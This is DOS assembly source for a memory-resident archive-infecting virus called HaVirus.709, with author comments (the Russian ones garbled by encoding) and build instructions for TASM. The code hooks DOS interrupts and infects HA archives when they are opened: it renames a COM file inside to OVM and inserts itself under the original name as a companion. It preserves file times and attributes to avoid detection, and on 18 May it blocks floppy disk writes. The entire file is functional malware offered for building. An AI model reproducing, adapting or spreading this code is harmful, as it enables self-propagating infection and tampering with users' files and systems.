   ; COMMENT %
   ;
   ;
   ;   HA-WORM.TSR. First, it looks into archive for any COM file,
   ;   then renames it to OVM and last, adds ifself into archive
   ;   under the original name. When user has executed an infected
   ;   file, virus installs itself into memory and then executes
   ;   original file (OVM). Thus, user thinks that all goes allright.
   ;
   ;    …é¥ ®¤¨ ¯à®¤ãªâ   áâ àãî â¥¬ã - ç¥à¢ì ¢  àå¨¢ å. •®âï â¥¬  ¥ á®¢á¥¬
   ; áâ à ï, ï ¡ë ¤ ¦¥ áª § « - ®¢ ï. ‚®-¯¥à¢ëå, ç¥à¢ì § à ¦ ¥â  àå¨¢ë HA, ç¥£®, ¯®
   ; ¬®¨¬ ¤ ë¬, ¥é¥ ¨ªâ® ¥ ¤¥« «. ‚®-¢â®àëå, § à ¦ ¥â ® ¨å ¥ á®¢á¥¬ ®¡ëçë¬
   ; ®¡à §®¬. Ž¡ëçë¥ ç¥à¢¨ ¤®¡ ¢«ïîâ á¥¡ï ¢  àå¨¢ ¯®¤ á«ãç ©ë¬, «¨¡®, çâ® ¥é¥
   ; åã¦¥, ¯®¤ ä¨ªá¨à®¢ ë¬ ¨¬¥¥¬, ¨ ¥é¥ ¤ «¥ª® ¥ ä ªâ, çâ® ¯®«ì§®¢ â¥«ì § ¯ãáâ¨â
   ; â ª®© ä ©«. *â®â ¦¥ ç¥à¢ì ¯à®å®¤¨â ¯® ¢á¥¬ã  àå¨¢ã (à §¡¥à ï ¥£® ä®à¬ â) ¨ ¨é¥â
   ; ¢ ¥¬ ä ©« á à áè¨à¥¨¥¬ COM. „ «¥¥ ® ¯¥à¥¨¬¥®¢ë¢ ¥â íâ®â ä ©« (¬¥ï¥â
   ; à áè¨à¥¨¥   OVM),   á ¬ á¥¡ï ¤®¡ ¢«ï¥â ¢  àå¨¢ ¯®¤  áâ®ïé¨¬ ¨¬¥¥¬ â®«ìª®
   ; çâ® ¯¥à¥¨¬¥®¢ ®£® ä ©« . ‚ à¥§ã«ìâ â¥ ¯®á«¥ à á¯ ª®¢ª¨  àå¨¢  ¢ ¥¬
   ; ®ª §ë¢ îâáï ¤¢  ä ©«  ¢¬¥áâ® ®¤®£®: ANYFILE.COM (íâ® ç¥à¢ì) ¨ ANYFILE.OVM
   ; (íâ® ®¡ëç ï ¯à®£à ¬¬ ). *® ¨ íâ® ¥é¥ ¥ ¢á¥. …á«¨ § ¯ãáâ¨âì ä ©« ANYFILE.COM,
   ; â® â®â, á¤¥« ¢ ¢á¥, çâ® ¥¬ã ã¦®, § ¯ãáª ¥â ä ©« ANYFILE.OVM, ¨ ã ¯®«ì§®¢ â¥«ï
   ; á®§¤ ¥âáï ¢¯¥ç â«¥¨¥, çâ® ¢á¥ ¨¤¥â ®à¬ «ì® (¢¥¤ì ¥£® â® ¯à®£à ¬¬  à ¡®â ¥â!)
   ; ’® ¥áâì ¯®«ãç ¥âáï, çâ® íâ® ¥ ¯à®áâ® ç¥à¢ì,   ç¥à¢ì-ª®¬¯ ì® (¯®   «®£¨¨ á
   ; ®¡ëçë¬¨ ¢¨àãá ¬¨-ª®¬¯ ì® ¬¨, ® ¢  àå¨¢ å).
   ;    ‚¨àãá - à¥§¨¤¥âë©. ‡ à ¦ ¥â  àå¨¢ë HA ¯à¨ ¨å ®âªàëâ¨¨. „®¡ ¢«ï¥â á¥¡ï ¢
   ;  àå¨¢ ¯® ¬¥â®¤ã Stored (¡¥§  àå¨¢ æ¨¨ - ª ª ¥áâì). *¥ ¨§¬¥ï¥â  âà¨¡ãâ®¢ ¨
   ; ¢à¥¬¥¨ á®§¤ ¨ï  àå¨¢ . *¥ § à ¦ ¥â  àå¨¢ë ¯®¢â®à®, ¯à®¢¥àïï § à ¦¥®áâì
   ; ¯® ¯®á«¥¤¨¬ ¤¢ã¬ ¡ ©â ¬  àå¨¢ . 18 ¬ ï ¢¨àãá ãáâ  ¢«¨¢ ¥â   Int 13h á¢®©
   ; ®¡à ¡®âç¨ª, ª®â®àë© ¡«®ª¨àã¥â § ¯¨áì   ¤¨áª¥âë (á®§¤ ¥âáï ¢¯¥ç â«¥¨¥, çâ®
   ; ®¨ § é¨é¥ë ®â § ¯¨á¨).
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 17.02.2000
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;               Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+
   ;
   ;                   tasm /m havirus.asm
   ;                   tlink /t /x havirus.obj
   ;                   del havirus.obj
   ;
   ;
   ;               ” ©«ë ¨§  àå¨¢ :
   ;
   ;                   havirus.asm 10090 (¨áå®¤¨ª ¢¨àãá )
   ;                   havirus.com   709 (¡¨ à¨ª ¢¨àãá )
   ;                   havirus.doc  1006 (â¥å¨ç¥áª ï ¨ä®à¬ æ¨ï)
   ; %


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286
   Code        segment use16
           assume  cs:Code, ds:Code
           org 100h


   Start:      mov ax, 0ABCDh
           int 21h
           cmp ax, 0CDABh
           je  Exit


   ;[“ª®à ç¨¢ ¥¬ ¤«¨ã â¥ªãé¥£® ¡«®ª  ¯ ¬ïâ¨]

           mov ah, 4Ah
           mov bx, 1000h
           int 21h
           jc  Exit


   ;[*¥à¥áâ ¢«ï¥¬ Int 21h   Int 65h]

           mov ax, 3521h
           int 21h
           mov ds:[Ofs21h], bx
           mov ds:[Seg21h], es
           mov ax, 2565h
           mov dx, bx
           push    es
           pop ds
           int 21h


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¢¨àãá ]

           mov ah, 48h
           mov bx, VirSize/16+1
           int 21h
           jc  Exit
           mov es, ax


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           dec ax
           mov ds, ax
           mov ds:[1], word ptr 8


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ ¢ë¤¥«¥ãî ¯ ¬ïâì]

           push    cs
           pop ds
           mov si, offset Start
           xor di, di
           mov cx, CodeSize
           cld
           rep movsb


   ;[“áâ  ¢«¨¢ ¥¬ ®¢ë© ®¡à ¡®âç¨ª Int 21h]

           mov ax, 2521h
           mov dx, Int21h-Start
           push    es
           pop ds
           int 21h


   ;[*à®¢¥àï¥¬ á¨áâ¥¬ãî ¤ âã]

           mov ax, 0807h
           out 70h, al
           in  al, 71h
           xchg    ah, al
           out 70h, al
           in  al, 71h
           cmp ax, 1805h
           jne Exit


   ;[‘®åà ï¥¬  ¤à¥á áâ à®£® ®¡à ¡®âç¨ª  Int 13h]

           mov ax, 3513h
           int 65h
           mov ds:[Ofs13h-Start], bx
           mov ds:[Seg13h-Start], es


   ;[“áâ  ¢«¨¢ ¥¬ ®¢ë© ®¡à ¡®âç¨ª Int 13h]

           mov ax, 2513h
           mov dx, Int13h-Start
           int 65h

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[ˆé¥¬ ¨¬ï ä ©« ]

   Exit:       push    cs:[2Ch]
           pop ds
           mov di, 4
   Loop1:      cmp ds:[di-4], word ptr 0000
           jne L1
           cmp ds:[di-2], word ptr 0001
           je  Found1
   L1:     inc di
           jmp Loop1
   Found1:     mov dx, di


   ;[ˆé¥¬ ª®¥æ ¨¬¥¨ ä ©«  ¨ ¬¥ï¥¬ ¥£® à áè¨à¥¨¥]

           call    FindZero
           mov ds:[di-3], 'VO'


   ;[*®¤£®â ¢«¨¢ ¥¬ ¡«®ª ¯ à ¬¥âà®¢ ¤«ï § ¯ãáª  ä ©« ]

           mov bx, offset PBlock
           mov cs:[bx+04h], cs
           mov cs:[bx+08h], cs
           mov cs:[bx+0Ch], cs


   ;[‡ ¯ãáª ¥¬ ä ©«]

           mov ax, 4B00h
           push    cs
           pop es
           int 21h
           ret


   ;[*«®ª ¯ à ¬¥âà®¢ ¤«ï § ¯ãáª  ä ©« ]

   PBlock      dw  0
           dw  80h,0
           dw  5Ch,0
           dw  6Ch,0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                Ž**€*Ž’—ˆŠˆ
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int13h:     cmp ah, 3
           jne Quit$
           cmp dl, 0
           je  Protect
           cmp dl, 1
           je  Protect

   Quit$:      db  0EAh
   Ofs13h      dw  0
   Seg13h      dw  0

   Protect:    push    bp
           mov bp, sp
           or  [bp+6], byte ptr 00000001b
           pop bp

           mov ah, 3
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int21h:     cmp ax, 0ABCDh
           jne NotTest
           xchg    ah, al
           iret


   NotTest:    pusha
           push    ds

           cmp ah, 3Dh
           je  FileOpen

   QuitA:      jmp Quit
   RestAttrA:  jmp RestAttr
   CloseA:     jmp Close


   ;[ˆé¥¬ ª®¥æ ¨¬¥¨ ä ©« ]

   FileOpen:   mov di, dx
           call    FindZero


   ;[*à®¢¥àï¥¬ â¨¯ ä ©« ]

           mov ax, ds:[di-3]
           and ah, 0DFh
           cmp ax, 'H.'
           jne QuitA
           mov al, ds:[di-1]
           and al, 0DFh
           cmp al, 'A'
           jne QuitA


   ;[‘®åà ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4300h
           int 65h
           jc  QuitA
           push    cx
           push    dx
           push    ds


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h
           xor cx, cx
           int 65h
           jc  RestAttrA


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov ax, 3D02h
           int 65h
           jc  RestAttrA
           xchg    bx, ax


   ;[‘®åà ï¥¬ ¢à¥¬ï ¨ ¤ âã á®§¤ ¨ï ä ©« ]

           mov ax, 5700h
           int 65h
           jc  CloseA
           push    dx
           push    cx


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   2 ¡ ©â  ®â ª®æ  ä ©« ]

           mov ax, 4202h
           mov cx, 0FFFFh
           mov dx, 0FFFEh
           int 65h
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ ¯®á«¥¤¨¥ ¤¢  ¡ ©â ]

           mov cx, 2
           call    Read2
           jc  RestTime


   ;[*à®¢¥àï¥¬ ä ©«   § à ¦¥®áâì]

           cmp ds:[Temp-Start], 'VO'
           je  RestTime


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           mov al, 0
           call    Seek
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ £« ¢ë© § £®«®¢®ª]

           mov cx, 4
           call    Read2
           jc  RestTime


   ;[*â®  àå¨¢ HA?]

           cmp ds:[Temp-Start], 'AH'
           jne RestTime
           mov si, ds:[Temp+2-Start]
           inc word ptr ds:[Temp+2-Start]


   ;[‘ç¨âë¢ ¥¬ áâ â¨ç¥áª¨¥ ¤ ë¥ § £®«®¢ª ]

   Loop2:      mov cx, 11h
           mov dx, Header-Start
           call    Read
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ ¯ãâì ª ä ©«ã ¨ ¨¬ï ä ©« ]

           mov di, Header+11h-Start
           call    SeekZero
           jc  RestTime
           call    SeekZero
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ ®áâ â®ª § £®«®¢ª ]

           mov cx, 3
           call    Read1
           jc  RestTime


   ;[*â® COM ä ©«?]

           mov ax, ds:[di-5]
           and ah, 0DFh
           cmp ax, 'C.'
           jne Next
           mov ax, ds:[di-3]
           and ax, 0DFDFh
           cmp ax, 'MO'
           je  Found2


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   á«¥¤ãîé¨© ¡«®ª]

   Next:       mov ax, 4201h
           mov dx, ds:[Header+1-Start]
           mov cx, ds:[Header+3-Start]
           int 65h

           dec si
           jnz Loop2

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

   RestTime:   mov ax, 5701h
           pop cx
           pop dx
           int 65h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      mov ah, 3Eh
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop ds
           pop dx
           pop cx
           int 65h


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥  áâ®ïé¥¬ã ®¡à ¡®âç¨ªã Int 21h]

   Quit:       pop ds
           popa

           db  0EAh
   Ofs21h      dw  0
   Seg21h      dw  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[*¥à¥¬¥é ¥¬ ãª § â¥«ì   à áè¨à¥¨¥ ä ©« ]

   Found2:     mov ax, 4201h
           mov cx, 0FFFFh
           mov dx, 0FFF9h
           int 65h
           jc  RestTime


   ;[Œ¥ï¥¬ à áè¨à¥¨¥  ©¤¥®£® ä ©« ]

           mov cx, 2
           mov dx, Dummy-Start
           call    Write
           jc  RestTime


   ;[‚ëç¨á«ï¥¬ CRC32 ¢¨àãá ]

           xor si, si
           mov ax, 0FFFFh
           mov dx, ax
   Loop3:      xor al, ds:[si]
           mov cx, 8
   Loop4:      shr dx, 1
           rcr ax, 1
           jnc Skip
           xor dx, 0EDB8h
           xor ax, 08320h
   Skip:       loop    Loop4
           inc si
           cmp si, CodeSize
           jne Loop3
           not dx
           not ax


   ;[Œ¥ï¥¬ ¯®«ï § £®«®¢ª ]

           mov ds:[Header-Start+00h], byte ptr 20h
           mov ds:[Header-Start+01h], word ptr CodeSize
           mov ds:[Header-Start+03h], word ptr 0
           mov ds:[Header-Start+05h], word ptr CodeSize
           mov ds:[Header-Start+07h], word ptr 0
           mov ds:[Header-Start+09h], ax
           mov ds:[Header-Start+0Bh], dx


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢ ª®¥æ ä ©« ]

           mov al, 2
           call    Seek
           jc  RestTimeB


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© § £®«®¢®ª]

           lea cx, [di+3]
           mov dx, Header-Start
           sub cx, dx
           call    Write
           jc  RestTimeB


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá]

           mov cx, CodeSize
           xor dx, dx
           call    Write
           jc  RestTimeB


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           mov al, 0
           call    Seek
           jc  RestTimeB


   ;[‡ ¯¨áë¢ ¥¬ ®á®¢®© § £®«®¢®ª]

           mov cx, 4
           mov dx, Temp-Start
           call    Write
   RestTimeB:  jmp RestTime

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ











   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                             *Ž„**Žƒ*€ŒŒ›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   SeekZero:   mov cx, 1
           call    Read1
           jc  Error
           inc di
           cmp ds:[di-1], byte ptr 0
           jne SeekZero
   Error:      ret


   FindZero:   inc di
           cmp ds:[di], byte ptr 0
           jne FindZero
           ret


   Write:      mov ah, 40h
           jmp Int65h
   Read1:      mov dx, di
           jmp Read
   Read2:      mov dx, Temp-Start
   Read:       mov ah, 3Fh
           push    cs
           pop ds
   Int65h:     int 65h
           ret


   Seek:       mov ah, 42h
           xor cx, cx
           xor dx, dx
           jmp Int65h

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                    „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   VirName     db  'HaVirus.709 -- Copyright (c) by DJ Sadovnikov'
   Dummy       db  'OV'

   CodeSize    =   $ - Start

   Temp        dw  ?,?
   Header      db  121h dup (?)

   VirSize     =   $ - Start

   Code        ends
           end Start
